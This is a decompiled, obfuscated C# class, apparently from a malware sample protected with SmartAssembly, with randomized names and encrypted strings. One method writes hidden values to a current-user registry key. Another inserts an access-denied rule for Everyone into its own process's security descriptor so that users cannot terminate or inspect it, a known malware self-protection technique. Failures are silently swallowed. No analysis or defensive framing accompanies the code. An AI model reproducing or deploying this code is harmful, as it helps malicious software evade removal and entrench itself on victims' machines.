using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace maXgRZLUwUwi;

internal sealed class nSdQzcSxKjAf
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr JvisAHFEyawj, int ilknFbnFpRUDCD, [Out] byte[] OxBXNfqmAvAlw, uint oTLwnMTLwCHf, out uint jBAyUXIKXryRO);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr CpLMiaMHqLXfH, int vKRwSLrNzXCJQ, [In] byte[] FBSYscBxYNwvmxt);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void XeanfyAjwjiCMvK(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107407549)));
			registryKey.SetValue(dVGeYGcQgLS.KPabEeiJZVewrU(getString_0(107407956)), getString_0(107408149));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor JdjthYTEHMm(IntPtr intptr_0)
	{
		byte[] oxBXNfqmAvAlw = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, oxBXNfqmAvAlw, 0u, out var jBAyUXIKXryRO);
		if ((long)jBAyUXIKXryRO > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, oxBXNfqmAvAlw = new byte[jBAyUXIKXryRO], jBAyUXIKXryRO, out jBAyUXIKXryRO))
		{
			return null;
		}
		return new RawSecurityDescriptor(oxBXNfqmAvAlw, 0);
	}

	private void kIjUcSucRto(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void IygBAHmYJnC()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = JdjthYTEHMm(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			kIjUcSucRto(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static nSdQzcSxKjAf()
	{
		Strings.CreateGetStringDelegate(typeof(nSdQzcSxKjAf));
	}
}
